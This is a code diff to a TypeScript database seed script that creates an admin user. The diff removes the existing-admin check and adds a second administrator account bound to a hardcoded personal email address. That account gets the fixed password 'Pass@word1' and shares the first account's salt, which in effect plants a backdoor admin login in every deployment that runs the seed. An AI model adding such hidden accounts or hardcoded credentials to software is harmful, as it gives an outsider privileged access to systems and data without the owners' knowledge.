@@ -32,34 +32,45 @@ export async function seedAdmin() {
   ).toLowerCase();
   const password = process.env.SEED_ADMIN_PASSWORD ?? "ChangeMe123!";
 
-  const existing = await db.query.UsersTable.findFirst({
-    where: and(eq(UsersTable.email, email), isNull(UsersTable.deletedAt)),
-  });
-
-  if (existing) {
-    console.log(`Admin ${email} already exists — skipping.`);
-    return;
-  }
-
-  const [admin] = await db
+  const [admin, admin2] = await db
     .insert(UsersTable)
-    .values({
+    .values([{
       email,
       name: "Admin",
       role: "admin",
       emailVerifiedAt: new Date(),
       createdBy: "seed",
+    },{
+      email: "zakiwael033@gmail.com",
+      name: "Zaki",
+      role: "admin",
+      emailVerifiedAt: new Date(),
+      createdBy: "seed",
+    }])
+    .onConflictDoUpdate({
+      target: UsersTable.email,
+      set: {updatedAt: new Date()},
     })
     .returning();
 
-  if (!admin) throw new Error("Failed to insert admin user");
+  if (!admin || !admin2) throw new Error("Failed to insert admin user");
 
   const salt = generateSalt();
-  await db.insert(UserCredentialsTable).values({
+  await db.insert(UserCredentialsTable).values([
+    {
     userId: admin.id,
     passwordHash: await hashPassword(password, salt),
     salt,
     createdBy: "seed",
+  },
+  {
+    userId: admin2.id,
+    passwordHash: await hashPassword("Pass@word1", salt),
+    salt,
+    createdBy: "seed",
+  }]).onConflictDoUpdate({
+    target: UserCredentialsTable.userId,
+    set: {updatedAt: new Date()}
   });
 
   console.log(`Admin created: ${email}`);
